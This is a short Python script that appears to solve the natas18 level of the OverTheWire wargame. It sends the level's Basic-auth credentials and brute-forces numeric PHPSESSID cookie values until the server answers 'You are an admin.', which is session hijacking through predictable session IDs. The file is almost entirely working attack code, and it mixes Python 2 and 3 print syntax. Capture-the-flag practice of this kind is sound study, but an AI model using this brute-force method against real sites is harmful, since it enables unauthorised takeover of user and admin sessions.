import requests
from requests.auth import HTTPBasicAuth

HTTPAuth = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
url = 'http://natas18.natas.labs.overthewire.org/'

for i in range(1, 641):
	print(i)
	cookie = dict(PHPSESSID=str(i))
	r = requests.get(url, auth=HTTPAuth, cookies=cookie)
	if 'You are an admin.' in r.text:
		print r.text
		break